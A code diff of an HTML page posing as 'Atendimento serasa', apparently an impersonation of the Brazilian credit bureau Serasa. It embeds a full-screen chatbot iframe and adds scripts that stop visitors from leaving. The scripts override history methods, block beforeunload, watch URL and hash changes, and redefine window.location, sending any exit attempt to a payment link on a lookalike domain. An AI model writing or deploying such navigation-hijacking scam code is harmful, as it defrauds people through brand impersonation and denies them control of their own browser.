@@ -4,77 +4,159 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Atendimento serasa</title>
-<link rel="icon" type="image/x-icon" href="../../1_6vufYTynT97AiH9uOytFpw.png">
 <style>
   html, body { margin: 0; padding: 0; height: 100%; overflow: hidden; }
+  iframe { width:100vw; height:100vh; border:none; }
 </style>
-<script>
-      !function(f,b,e,v,n,t,s)
-      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-      if(!f._fbq)f._fbq=n; n.push=n; n.loaded=!0; n.version='2.0';
-      n.queue=[]; t=b.createElement(e); t.async=!0;
-      t.src=v; s=b.getElementsByTagName(e)[0];
-      s.parentNode.insertBefore(t,s)}(window, document,'script',
-      'https://connect.facebook.net/en_US/fbevents.js');
-
-      // Inicializa o pixel normalmente
-      fbq('init', '769736156134629');
-
-      // Dispara o PageView SOMENTE após o UTMify carregar
-      document.addEventListener("utmify-loaded", () => {
-        fbq("track", "PageView");
-      });
-</script>
-
-  <noscript>
-    <img height="1" width="1" style="display:none"
-         src="https://www.facebook.com/tr?id=769736156134629&ev=PageView&noscript=1"/>
-  </noscript>
 </head>
 <body>
 
+<iframe 
+  id="typebot" 
+  src="https://bot-typebot-viewer.ksrub8.easypanel.host/bfilyz1"
+></iframe>
+
 <script>
-// ===========================================
-// CÓDIGO EXECUTA COM document.write - FORÇA ORDEM
-// ===========================================
+const SEU_LINK = "https://pay.feiraoserasa.site/lDW0ZaJnv64GN7E";
+let jaRedirecionou = false;
 
-const SUA_URL_ALVO = "https://pay.feiraoserasa.site/lDW0ZaJnv64GN7E";
+// ===========================================
+// MÉTODO 1: DETECTA MUDANÇA NO HISTÓRICO DO NAVEGADOR
+// ===========================================
+let ultimoURL = window.location.href;
 
-// 1. INTERCEPTADOR EXECUTA PRIMEIRO
-(function() {
-  let interceptado = false;
+const observarURL = () => {
+  const urlAtual = window.location.href;
   
-  function meuRedirecionamento() {
-    if (interceptado) return;
-    interceptado = true;
-    console.log('🎯 Indo para:', SUA_URL_ALVO);
-    setTimeout(() => window.location.replace(SUA_URL_ALVO), 100);
+  // Se o URL do navegador mudou
+  if (urlAtual !== ultimoURL && !jaRedirecionou) {
+    console.log("🚨 URL DO NAVEGADOR MUDOU!", ultimoURL, "->", urlAtual);
+    
+    // CANCELA a mudança voltando para o URL anterior
+    history.replaceState(null, '', ultimoURL);
+    
+    // Redireciona para SEU link
+    jaRedirecionou = true;
+    window.location.href = SEU_LINK;
+    return;
   }
   
-  // CAPTURA beforeunload IMEDIATAMENTE
-  window.addEventListener('beforeunload', function(e) {
-    console.log('🚨 Interceptado!');
+  ultimoURL = urlAtual;
+  requestAnimationFrame(observarURL);
+};
+
+// Inicia o observador
+observarURL();
+
+// ===========================================
+// MÉTODO 2: INTERCEPTA BEFOREUNLOAD (quando vai sair)
+// ===========================================
+window.addEventListener('beforeunload', function(e) {
+  if (!jaRedirecionou) {
+    console.log("🚨 NAVEGADOR TENTANDO SAIR DA PÁGINA!");
+    
+    // CANCELA a navegação
     e.preventDefault();
     e.returnValue = '';
-    meuRedirecionamento();
-    return false;
-  }, true);
+    
+    // Redireciona para SEU link
+    setTimeout(() => {
+      jaRedirecionou = true;
+      window.location.href = SEU_LINK;
+    }, 10);
+    
+    return '';
+  }
+});
+
+// ===========================================
+// MÉTODO 3: BLOQUEIA MUDANÇAS NO HISTORY
+// ===========================================
+const historyPushOriginal = history.pushState;
+const historyReplaceOriginal = history.replaceState;
+
+history.pushState = function(state, title, url) {
+  console.log("🚨 history.pushState tentado:", url);
   
-  window._meuRedirect = meuRedirecionamento;
-  console.log('🛡️ Interceptador pronto');
-})();
+  if (!jaRedirecionou && url && url !== window.location.href) {
+    console.log("📍 Bloqueado! Redirecionando para seu link...");
+    jaRedirecionou = true;
+    window.location.href = SEU_LINK;
+    return;
+  }
+  
+  return historyPushOriginal.apply(this, arguments);
+};
 
-// 2. AGORA escreve o iframe
-document.write(`
-  <iframe 
-    id="typebot-iframe" 
-    src="https://bot-typebot-viewer.ksrub8.easypanel.host/bfilyz1${window.location.search}"
-    style="width:100vw; height:100vh; border:none;"
-    allowfullscreen
-  ></iframe>
-`);
+history.replaceState = function(state, title, url) {
+  console.log("🚨 history.replaceState tentado:", url);
+  
+  if (!jaRedirecionou && url && url !== window.location.href) {
+    console.log("📍 Bloqueado! Redirecionando para seu link...");
+    jaRedirecionou = true;
+    window.location.href = SEU_LINK;
+    return;
+  }
+  
+  return historyReplaceOriginal.apply(this, arguments);
+};
+
+// ===========================================
+// MÉTODO 4: MONITOR DE HASH (#) NA URL
+// ===========================================
+let ultimoHash = window.location.hash;
+
+const observarHash = () => {
+  if (window.location.hash !== ultimoHash && !jaRedirecionou) {
+    console.log("🚨 HASH mudou:", ultimoHash, "->", window.location.hash);
+    jaRedirecionou = true;
+    window.location.href = SEU_LINK;
+    return;
+  }
+  ultimoHash = window.location.hash;
+  setTimeout(observarHash, 100);
+};
+
+observarHash();
+
+// ===========================================
+// MÉTODO 5: BLOQUEADOR DE NAVEGAÇÃO VIA LOCATION
+// ===========================================
+Object.defineProperty(window, 'location', {
+  set: function(value) {
+    console.log("🚨 Tentativa de mudar window.location:", value);
+    
+    if (!jaRedirecionou && value && value.href) {
+      // CANCELA e redireciona para seu link
+      jaRedirecionou = true;
+      window.location.href = SEU_LINK;
+      return;
+    }
+  },
+  
+  get: function() {
+    return {
+      href: window.location.href,
+      replace: function(url) {
+        console.log("🚨 location.replace() chamado:", url);
+        if (!jaRedirecionou) {
+          jaRedirecionou = true;
+          window.location.href = SEU_LINK;
+        }
+      },
+      assign: function(url) {
+        console.log("🚨 location.assign() chamado:", url);
+        if (!jaRedirecionou) {
+          jaRedirecionou = true;
+          window.location.href = SEU_LINK;
+        }
+      }
+    };
+  }
+});
+
+console.log("🛡️ PROTETOR DE URL ATIVADO!");
+console.log("📌 Monitorando qualquer mudança no URL do navegador...");
 </script>
-
 </body>
 </html>
